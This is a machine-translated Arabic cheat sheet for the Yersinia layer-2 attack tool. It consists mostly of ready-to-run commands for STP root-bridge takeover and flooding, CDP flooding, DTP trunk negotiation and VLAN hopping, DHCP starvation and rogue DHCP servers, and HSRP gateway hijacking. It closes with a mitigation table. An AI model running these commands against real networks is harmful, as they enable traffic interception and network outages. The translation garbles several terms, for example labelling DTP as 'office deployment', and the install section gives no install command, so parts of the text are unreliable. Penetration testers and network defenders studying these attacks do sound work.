# ورقة الغش يرسينيا

[Yersinia](https://github.com/tomac/yersinia) هو إطار عمل قوي لاختبار اختراق الشبكة من الطبقة الثانية (طبقة ارتباط البيانات) مصمم لتحليل نقاط الضعف في بروتوكولات الطبقة الثانية واستغلالها مثل STP (بروتوكول الشجرة الممتدة)، وCDP (بروتوكول اكتشاف Cisco)، وDTP (بروتوكول التوصيل الديناميكي)، وDHCP، وHSRP، وقنوات VLAN 802.1Q.

## البروتوكولات والأوضاع المدعومة

تستهدف يرسينيا البروتوكولات التي تعمل تحت IP:
- **STP:** بروتوكول الشجرة الممتدة (استيلاء دور الجسر الجذري، إشعارات تغيير الهيكل).
- **CDP:** Cisco Discovery Protocol (إغراق الجهاز، حقن الجوار المزيف).
- **DTP:** بروتوكول الاتصال الديناميكي (التفاوض على روابط الاتصال للوصول إلى جميع شبكات VLAN).
- **DHCP:** بروتوكول التكوين الديناميكي للمضيف (خوادم DHCP التجويع والمارقة).
- **HSRP:** بروتوكول جهاز التوجيه الاستعداد السريع (استيلاء البوابة النشطة).
- **802.1Q / 802.1X:** التنقل عبر شبكة محلية ظاهرية (Dot1Q) واستنفاد EAPOL.
- **VTP:** بروتوكول توصيل شبكة VLAN (حذف / الكتابة فوق قاعدة بيانات VLAN).

أوضاع التنفيذ:
- **`-I` (اللعنات التفاعلية):** واجهة مستخدم طرفية بملء الشاشة لاختيار البروتوكولات وتكوين الهجمات ومراقبة الحزم المباشرة.
- ** سطر الأوامر غير التفاعلي: ** التنفيذ المباشر للنصوص الآلية.

```bash
# Debian / Ubuntu / Kali Linux

yersinia -h
```

## وضع اللعنات التفاعلية (`-I`)

الطريقة الأكثر عملية وآمنة لاستخدام Yersinia في الجهاز بدون واجهة المستخدم الرسومية:
```bash
sudo yersinia -I
```
- **`h`**: عرض المساعدة وربط المفاتيح.
- **`g`**: تبديل البروتوكولات (STP، CDP، DTP، DHCP، HSRP، وما إلى ذلك).
- **`x`**: تنفيذ قائمة الهجوم للبروتوكول الحالي.
- **`c`**: إلغاء الهجوم الجاري.
- **`l`**: تبديل تسجيل الحزم.
- **`q`**: اخرج من يرسينيا.

## هجمات بروتوكول الشجرة الممتدة (STP).

يقوم STP باختيار جسر جذر ذي أدنى معرف جسر (الأولوية + MAC). يمكن لـ Yersinia حقن وحدات BPDU (وحدات بيانات بروتوكول الجسر) المزيفة للمطالبة بحالة الجذر وإعادة توجيه حركة المرور عبر المضيف المهاجم.

### 1. المطالبة بدور الجذر (حقن BPDU)
أرسل وحدات BPDU ذات الأولوية `0` وعنوان MAC أقل لتصبح جسر الجذر STP:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. المطالبة بدور الجذر مع تغيير الهيكل (TCN)
فرض جميع المفاتيح لمسح جداول CAM وإعادة التقارب من خلال المهاجم:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. هجوم STP DoS (وحدات BPDU لتكوين الفيضان)
تعطل وحدة المعالجة المركزية أو تشبعها بإطارات BPDU المتضاربة الضخمة:
```bash
sudo yersinia stp -attack 0 -i eth0
```

## هجمات بروتوكول اكتشاف Cisco (CDP).

يشارك CDP أسماء الأجهزة ونماذجها وإمكاناتها وإصدارات البرامج التي لم تتم مصادقتها عبر أجهزة Cisco.

### 1. الفيضانات المزيفة لجيران CDP
ذاكرة تبديل العادم وإنشاء الأجهزة الوهمية في `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. التقاط وفحص حزم CDP المشروعة
قم بتشغيل وضع اللعنات التفاعلية (`yersinia -I`)، واضغط على `g`، وحدد `CDP`، ولاحظ اسم مضيف المحول، وIP الإدارة، وطراز الجهاز، ومعرف VLAN الأصلي.

## بروتوكول التوصيل الديناميكي (DTP) والتنقل بين شبكات VLAN

يقوم DTP تلقائيًا بالتفاوض على روابط التوصيل إذا تم تكوين منافذ المحول في وضع `dynamic desirable` أو `dynamic auto`.

### 1. التفاوض على رابط التوصيل (حزمة DTP المرغوبة)
خداع منفذ التبديل ليتحول إلى صندوق 802.1Q:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
بمجرد التفاوض على قناة الاتصال، التقط الإطارات من جميع شبكات VLAN أو قم بوضع علامات على الحزم في شبكات فرعية معزولة باستخدام واجهات Linux 802.1Q:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```

## هجمات DHCP المارقة والمجاعة

### 1. هجوم جوع DHCP (تجمع IP العادم)
أرسل الآلاف من طلبات DHCP DISCOVER باستخدام عناوين MAC عشوائية لاستهلاك جميع عناوين IP المتوفرة في التجمع:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. قم بإعداد خادم Rogue DHCP
انشر خادم DHCP مخادع باستخدام DNS وبوابة مخصصة:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```

## اختطاف HSRP وVRRP

يسمح HSRP لأجهزة توجيه متعددة بتقديم بوابة افتراضية واحدة.

### 1. المطالبة بأولوية جهاز التوجيه النشط
قم بإدخال حزم HSRP HELLO ذات الأولوية 255 لتولي عنوان IP للبوابة الافتراضية:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```

## التخفيف والتصلب

| البروتوكول | ناقل الهجوم | سيسكو / التخفيف القياسي |
|---|---|---|
| **STP** | حقن جسر الجذر الوهمي | `spanning-tree bpduguard enable` على منافذ الوصول؛ `spanning-tree rootguard` على الروابط المشتركة. |
| **النشر المكتبي** | التفاوض على الجذع المارق | `switchport mode access` و`switchport nonegotiate` على جميع منافذ الوصول التي تواجه المستخدم. |
| **CDP** | الفيضانات / الكشف عن المعلومات | `no cdp run` (عالميًا) أو `no cdp enable` على منافذ واجهة غير موثوقة. |
| **DHCP** | خادم المجاعة والمارقة | قم بتمكين `ip dhcp snooping`، وحدد المعدل لكل منفذ، وقم بتكوين منافذ الوصلة الصاعدة الموثوقة. |
| **HSRP** | اختطاف الأولوية | قم بتكوين مصادقة MD5 باستخدام المفاتيح السرية (`standby 1 authentication md5 key-string <SECRET>`). |
